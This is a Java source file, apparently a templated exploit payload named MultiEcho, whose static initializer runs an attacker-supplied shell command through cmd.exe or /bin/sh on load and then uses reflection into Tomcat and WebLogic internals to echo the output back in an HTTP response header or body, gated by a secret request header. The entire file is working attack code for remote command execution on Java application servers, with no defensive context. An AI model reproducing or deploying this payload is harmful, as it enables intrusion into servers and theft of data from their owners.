package payload;

import java.lang.reflect.Field;
import java.util.Iterator;
import java.util.List;
import java.util.Scanner;

public class MultiEcho {
    static String action = "{{action}}";
    static String position = "{{position}}";
    static String cmd = "{{cmd}}";
    static String headerAuKey = "{{header-au-key}}";
    static String headerAuVal = "{{header-au-val}}";
    static String headerKey = "{{header}}";

    public MultiEcho() {
    }

    private static void start() {
        try {
            Class.forName("org.apache.catalina.connector.Response");
            tomcat();
        } catch (Exception var2) {
            try {
                Class.forName("weblogic.work.ExecuteThread");
                WeblogicEchoTemplate();
            } catch (Exception var1) {
            }
        }
    }

    private static void tomcat() {
        try {
            Thread[] var5 = (Thread[])((Thread[])getFV(Thread.currentThread().getThreadGroup(), "threads"));

            for(int i = 0; i < var5.length; ++i) {
                Thread var7 = var5[i];
                if (var7 != null) {
                    String var3 = var7.getName();
                    if (!var3.contains("exec") && var3.contains("http")) {
                        Object var1 = getFV(var7, "target");
                        if (var1 instanceof Runnable) {
                            try {
                                var1 = getFV(getFV(getFV(var1, "this$0"), "handler"), "global");
                            } catch (Exception var14) {
                                continue;
                            }

                            List var9 = (List)getFV(var1, "processors");
                            Iterator var8 = var9.iterator();

                            while(var8.hasNext()) {
                                Object var11 = var8.next();
                                var1 = getFV(var11, "req");
                                Object var2 = var1.getClass().getMethod("getResponse").invoke(var1);
                                String var15 = (String)var1.getClass().getMethod("getHeader", String.class).invoke(var1, headerAuKey);
                                if (var15 != null && var15.equals(headerAuVal)) {
                                    var2.getClass().getMethod("setStatus", Integer.TYPE).invoke(var2, new Integer(200));
                                    switch (position) {
                                        case "body":
                                            writeBody(var2, cmd.getBytes());
                                        default:
                                            var2.getClass().getDeclaredMethod("addHeader", String.class, String.class).invoke(var2, headerKey, cmd);
                                            return;
                                    }
                                }
                            }
                        }
                    }
                }
            }
        } catch (Exception var15) {
            var15.printStackTrace();
        }

    }

    private static void writeBody(Object var0, byte[] var1) throws Exception {
        Object var2;
        Class var3;
        try {
            var3 = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
            var2 = var3.newInstance();
            var3.getDeclaredMethod("setBytes", byte[].class, Integer.TYPE, Integer.TYPE).invoke(var2, var1, new Integer(0), new Integer(var1.length));
            var0.getClass().getMethod("doWrite", var3).invoke(var0, var2);
        } catch (NoSuchMethodException var5) {
            var3 = Class.forName("java.nio.ByteBuffer");
            var2 = var3.getDeclaredMethod("wrap", byte[].class).invoke(var3, var1);
            var0.getClass().getMethod("doWrite", var3).invoke(var0, var2);
        }

    }

    private static Object getFV(Object var0, String var1) throws Exception {
        Field var2 = null;
        Class var3 = var0.getClass();

        while(var3 != Object.class) {
            try {
                var2 = var3.getDeclaredField(var1);
                break;
            } catch (NoSuchFieldException var5) {
                var3 = var3.getSuperclass();
            }
        }

        if (var2 == null) {
            throw new NoSuchFieldException(var1);
        } else {
            var2.setAccessible(true);
            return var2.get(var0);
        }
    }

    public static void WeblogicEchoTemplate() {
        try {
            Object adapter = Class.forName("weblogic.work.ExecuteThread").getDeclaredMethod("getCurrentWork").invoke(Thread.currentThread());
            if (!adapter.getClass().getName().endsWith("ServletRequestImpl")) {
                Field field = adapter.getClass().getDeclaredField("connectionHandler");
                field.setAccessible(true);
                Object obj = field.get(adapter);
                adapter = obj.getClass().getMethod("getServletRequest").invoke(obj);
            }

            String var15 = (String)adapter.getClass().getMethod("getHeader", String.class).invoke(adapter, headerAuKey);
            if (var15 != null && var15.equals(headerAuVal)) {
                switch (position) {
                    case "body":
                        Object res = adapter.getClass().getMethod("getResponse").invoke(adapter);
                        Object sin = Class.forName("weblogic.xml.util.StringInputStream").getConstructor(String.class).newInstance(cmd);
                        Object out = res.getClass().getDeclaredMethod("getServletOutputStream").invoke(res);
                        out.getClass().getDeclaredMethod("writeStream", Class.forName("java.io.InputStream")).invoke(out, sin);
                        out.getClass().getDeclaredMethod("flush").invoke(out);
                        Object w = res.getClass().getDeclaredMethod("getWriter").invoke(res);
                        w.getClass().getDeclaredMethod("write", String.class).invoke(w, "");
                    default:
                        Object rsp = adapter.getClass().getDeclaredMethod("getResponse").invoke(adapter);
                        rsp.getClass().getDeclaredMethod("addHeader", String.class, String.class).invoke(rsp, headerKey, cmd);
                }
            }
        } catch (Exception var9) {
            var9.printStackTrace();
        }

    }

    static {
        try {
            switch (action) {
                case "exec":
                    String[] var12;
                    switch (position) {
                        case "header":
                            var12 = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
                            cmd = (new Scanner((new ProcessBuilder(var12)).start().getInputStream())).useDelimiter("\\A").next();
                            break;
                        case "body":
                            var12 = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
                            cmd = (new Scanner((new ProcessBuilder(var12)).start().getInputStream())).useDelimiter("\\A").next();
                    }
            }
        } catch (Exception var5) {
        }

        start();
    }
}
